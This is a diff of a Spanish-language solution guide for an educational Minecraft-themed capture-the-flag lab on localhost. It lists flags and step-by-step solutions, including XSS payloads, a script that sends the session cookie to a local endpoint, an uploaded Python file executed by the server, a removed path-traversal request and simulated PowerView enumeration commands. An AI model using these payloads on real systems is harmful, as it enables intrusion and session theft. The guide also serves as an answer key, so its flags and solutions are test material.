@@ -51,17 +51,24 @@ Este documento contiene la metodología de resolución paso a paso de los 9 desa
 
 ---
 
-###  Desafío 3: Portal del Nether
-- **Tema Académico:** *7º Semestre — Análisis de Metadatos y Reconocimiento Semi-pasivo (FOCA / Exif).*
-- **Herramientas Kali Linux:** `curl`, `wget`, `grep`, Navegador.
+###  Desafío 3: Consola de las Cuevas
+- **Tema Académico:** *7º Semestre — Enumeración de rutas y validación por allowlist.*
+- **Herramientas:** Navegador; opcionalmente `curl` para automatizar la consola.
 - **Procedimiento de Explotación:**
-  1. Hacer clic en "Inspeccionar Planos del Portal" o descargar `planos_portal_nether.txt`:
-     ```bash
-     curl -s http://localhost:8080/static/docs/planos_portal_nether.txt | grep "FLAG"
+  1. Entrar a `/overworld/cueva` desde la tarjeta del desafío 3.
+  2. Listar las cinco cuevas con `ls` y revisar el contenido de cada una con `ls <cueva>` y `cat <archivo>`.
+  3. Descartar la tablilla falsa de la cueva de hielo y leer los escritos de la bruja para la pista del Nether.
+  4. La llave real está en `/cueva/lago-de-lava/llave_ignicion.txt`; el calor de la lava conserva la inscripción.
      ```
-  2. Extraer la cabecera `X-Obsidian-Ignition-Key`.
+     steve@cueva:/cueva$ ls
+     bruja/  estalactitas/  hielo/  lago-de-lava/  luminosa/
+     steve@cueva:/cueva$ cat /cueva/lago-de-lava/llave_ignicion.txt
+     ```
+  5. Pegar la bandera en el formulario del desafío 3. La tablilla congelada devuelve un error: es un señuelo.
 - **Bandera Obtenida:**
   `FLAG{MINECRAFT_NETHER_PORTAL_METADATA_IGNITED}`
+- **Pista para el Nether:**
+  `/cueva/bruja/escritos_de_la_bruja.txt` indica que el caldero acepta recetas `.py` y que el secreto del Blaze está en `/secret/blaze_rod.txt`.
 
 ---
 
@@ -70,17 +77,29 @@ Este documento contiene la metodología de resolución paso a paso de los 9 desa
 ###  Desafío 1: Lingote de Oro
 - **Tema Académico:** *8º Semestre — Stored XSS y Robo de Cookies de Sesión.*
 - **Herramientas Kali Linux:** Navegador Firefox DevTools, Burp Suite, Netcat (`nc`).
+- **¿Qué es XSS?** Cross-Site Scripting (XSS) ocurre cuando una aplicación guarda o muestra
+  datos del usuario sin escaparlos. Si en lugar de texto escribes HTML o JavaScript, el
+  navegador de otra persona lo interpreta como código. En este reto la nota de la oferta se
+  guarda sin sanitizar (**XSS almacenado**) y la abre el Piglin Guard con su sesión privilegiada.
 - **Procedimiento de Explotación:**
-  1. En el formulario de ofertas de trueque con Piglins, ingresar en el campo **Nota al Piglin** el siguiente payload de XSS:
+  1. En el formulario de ofertas de trueque con Piglins, escribe en **Mensaje para el Piglin**
+     cualquiera de estos payloads básicos. No hace falta un script complejo: el bot acepta un XSS simple.
+     ```html
+     <script>alert(1)</script>
+     <script>console.log('XSS')</script>
+     <img src=x onerror=alert(1)>
+     <svg onload=alert(1)>
+     <a href="javascript:alert(1)">haz clic</a>
+     ```
+     El tablón que ve el jugador muestra el payload escapado para no ejecutarlo en su navegador;
+     el Guard lo interpreta en el suyo. Usa `console.log('XSS')` si no quieres ventanas emergentes.
+  2. Opcional: si quieres emular el robo de cookie completo, este payload envía la sesión del
+     Guard al buzón del Bastión:
      ```html
      <script>fetch('/nether/gold/leak?cookie=' + encodeURIComponent(document.cookie));</script>
      ```
-  2. O verificar la alerta emergente en el navegador:
-     ```html
-     <script>alert(document.cookie);</script>
-     ```
-  3. El bot simulado del Piglin Guard revisa la oferta y, al encontrar la referencia al
-     endpoint receptor, reproduce la exfiltración: envía su cookie real de tesorero.
+  3. El bot simulado del Piglin Guard revisa la oferta y, al encontrar un XSS simple o la
+     referencia al endpoint receptor, reproduce la exfiltración: envía su cookie real de tesorero.
   4. Al recargar `/nether`, el tablón muestra el **registro de credenciales comprometidas**
      con el token del Piglin:
      ```
@@ -101,18 +120,18 @@ Este documento contiene la metodología de resolución paso a paso de los 9 desa
 - **Tema Académico:** *8º Semestre — Arbitrary File Upload a Ejecución Remota de Código (RCE).*
 - **Herramientas Kali Linux:** Editor de texto (`nano`/`vim`), `curl`, Navegador.
 - **Procedimiento de Explotación:**
-  1. Crear un script en Python llamado `pocion_rce.py`:
+  1. La pista de la cueva de la bruja (Overworld, desafío 3) indica que el secreto está en `/secret/blaze_rod.txt`.
+  2. Crear un script en Python llamado `receta_blaze.py` que abra ese archivo y muestre su contenido:
      ```python
-     import os
      print(open('/secret/blaze_rod.txt').read())
      ```
-  2. Subirlo a través del formulario del caldero.
-  3. Visitar el enlace de ejecución generado:
+  3. Subirlo al caldero con el formulario. El caldero ejecuta la receta automáticamente y muestra la salida en la misma tarjeta.
+  4. Si se desea reejecutar manualmente:
      ```bash
-     curl http://localhost:8080/nether/blaze/execute/pocion_rce.py
+     curl http://localhost:8080/nether/blaze/execute/receta_blaze.py
      ```
 - **Bandera Obtenida:**
-  `FLAG{MINECRAFT_BLAZE_ROD_WEBSHELL_RCE}`
+  `FLAG{MINECRAFT_BLAZE_ROD_RECETA_EJECUTADA}`
 
 ---
 
@@ -163,21 +182,42 @@ Este documento contiene la metodología de resolución paso a paso de los 9 desa
 ---
 
 ###  Desafío 3: Huevo de Dragón
-- **Tema Académico:** *6º Semestre — Evasión de Honeypots y Path Traversal (LFI).*
-- **Herramientas Kali Linux:** `curl`, Navegador.
-- **Procedimiento de Explotación:**
-  1. La consulta al archivo por defecto `honeypot/fake_egg.txt` activa el señuelo.
-  2. Utilizar Path Traversal para salir del directorio web `/var/www/` y leer el archivo auténtico de superusuario:
-     ```bash
-     curl "http://localhost:8080/end/egg/inspect?altar_file=../../root/real_dragon_egg.txt"
+- **Tema Académico:** *Seguridad en la Nube — Enumeración de Active Directory con PowerView.*
+- **Herramientas:** Navegador (consola PowerView simulada) o PowerShell + PowerView en un laboratorio AD real.
+- **Contexto:** El Huevo de Dragón fue archivado en el dominio `end.local`. La consola de The End implementa un motor PowerView simulado: no ejecuta PowerShell ni accede al sistema de archivos del contenedor.
+- **Procedimiento de Enumeración:**
+  1. Confirma el dominio y su controlador:
+     ```powershell
+     Get-NetDomain
+     Get-NetDomainController
      ```
+  2. Enumera las cuentas de usuario y revisa sus descripciones:
+     ```powershell
+     Get-NetUser
+     ```
+     La cuenta de servicio `svc_backup` describe el vault en `\\END-FS01\vault`.
+  3. Confirma qué cuentas pertenecen al grupo que protege el recurso:
+     ```powershell
+     Get-NetGroupMember -GroupName "End Vault Admins"
+     ```
+  4. Descubre los recursos compartidos del dominio:
+     ```powershell
+     Find-DomainShare
+     ```
+     Aparece `\\END-FS01\vault` como almacén del Huevo de Dragón.
+  5. Lee el archivo del Huevo con la ruta UNC completa:
+     ```powershell
+     Get-Content \\END-FS01\vault\real_dragon_egg.txt
+     ```
+  6. Alternativas de apoyo: `Get-NetShare -ComputerName END-FS01`, `Get-NetComputer` e `Invoke-UserHunter` para confirmar la sesión de `svc_backup` en el servidor de archivos.
 - **Bandera Obtenida:**
   `FLAG{MINECRAFT_FINAL_DRAGON_EGG_VICTORY_GG}`
+- **Nota pedagógica:** En un AD real, este flujo demuestra por qué las descripciones de cuentas de servicio no deben exponer rutas internas y por qué los shares deben aplicar mínimo privilegio. La defensa incluye cuentas gMSA, ACLs por grupo, segmentación del servidor de archivos y monitorización de consultas LDAP/SMB.
 
 ---
 
 ##  PANTALLA FINAL DE VICTORIA
-Al ingresar las 9 banderas en sus respectivos desafíos, la barra HUD inferior se completará con los 9 ítems, desbloqueando el nivel 90 y redirigiendo automáticamente a `http://localhost:8080/victory` con el **Poema del End** y el resumen de competencias aprobadas.
+Al ingresar las 9 banderas en sus respectivos desafíos, la barra HUD inferior se completará con los 9 ítems, habrás acumulado la XP de las 9 banderas (+10 XP por cada una) y se redirigirá automáticamente a `http://localhost:8080/victory` con el **Poema del End** y el resumen de competencias aprobadas.
 
 ---
 
@@ -197,7 +237,7 @@ la sintaxis y construir el payload él mismo.
 | `' OR 1=1 --` listo para pegar | *"Hay dos condiciones unidas por un operador. Haz que la primera siempre sea cierta y comenta el resto"* |
 | `<script>fetch('/nether/gold/leak?cookie='+document.cookie)</script>` | *"La nota se renderiza como HTML. El bot ya expone un endpoint receptor en el propio servidor"* |
 | `CVE-2026-OVERLOAD_CRYSTALS` | *"El proveedor y el año suelen estar escritos en el propio token de la backdoor"* |
-| `../../root/real_dragon_egg.txt` | *"Hay dos ficheros que parecen el premio; uno es un señuelo colocado para que lo encuentres demasiado fácil"* |
+| `Get-Content \\END-FS01\vault\real_dragon_egg.txt` | *"Las descripciones de cuentas de servicio pueden revelar recursos internos; enumera el dominio, sus grupos y sus shares"* |
 | `tr 'A-Za-z' 'N-ZA-Mn-za-m'` | *"Un cifrado por sustitución que lleva el nombre de un emperador romano"* |
 
 Los botones ** Ver Código** se mantienen: la divulgación del código fuente vulnerable
@@ -206,7 +246,23 @@ reconocimiento que el alumno debe practicar.
 
 ---
 
-#  Decisiones pendientes de reunión
+#  
+---
+
+#  Actualizaciones de interfaz (UI) y guía de aprendizaje
+
+Las siguientes mejoras se incorporaron a la plataforma y afectan la experiencia del estudiante, aunque no cambian las soluciones:
+
+- **Iconos por imagen:** Los emojis del panel superior y de las páginas se reemplazaron por imágenes PNG específicas (`Inicio_wooden_pickaxe.png`, `Desafios_nether_star.png`, `Ranking_totem_of_undying.png`, `Guia_recipe_book.png`, `Acerca de_barrier.png`, `Diemncion del over word_grass_block.png`, `Dimencion del nether_netherrack.png`, `Dimencion del end_end_stone.png`).
+- **Guía de aprendizaje:** La pestaña "Guía" ahora es una guía de aprendizaje (no de solución) con un ítem por bandera: concepto, tema, explicación, comandos/herramientas de ejemplo y una curiosidad. Los comandos son ejemplos genéricos, no la solución directa.
+- **Playground de Command Injection (Dragón):** La bandera 2 de The End incluye un playground interactivo que muestra el comando construido en tiempo real y detecta metacaracteres.
+- **Botón "Siguiente dimensión":** La barra superior muestra un botón para avanzar a la siguiente dimensión cuando se desbloquea, usando la imagen de la dimensión correspondiente.
+- **PowerView (Huevo):** La bandera 9 de The End es una consola PowerView simulada para enumerar Active Directory (usuarios, grupos, equipos, shares) y leer el Huevo desde `\\END-FS01\vault`.
+
+Estas mejoras mantienen las soluciones documentadas en este archivo válidas.
+
+---
+Decisiones pendientes de reunión
 
 Estas ideas se descartaron temporalmente y **están pendientes de decisión del equipo**; no se han implementado.
 
@@ -220,9 +276,10 @@ Los corazones del HUD son hoy decorativos (`base.html`, `range(10)` fijo).
   consumibles, o que el nivel de XP baje como marca visible al consultar una pista.
 
 ### 2. Coste de consultar una pista
-Hoy el XP es decorativo: `NIVEL = banderas × 10`. No es un pool gastable.
-Para que "una pista cuesta 10 XP" tenga efecto haría falta un saldo real que
-descienda, o registrar el uso de pistas en la nota final del alumno.
+Implementado: cada bandera válida otorga **+10 XP** y consultar una pista consume
+**20 XP**. La XP es un saldo real y persistente (`student_profiles.xp`) que se
+muestra en el HUD junto a la botella de experiencia. Si no hay XP suficiente, la
+pista no se desbloquea; una pista ya investigada no vuelve a cobrarse.
 
 ### 3. Formato de las banderas
 Las 9 banderas usan el envoltorio `FLAG{...}`, idéntico en todas.
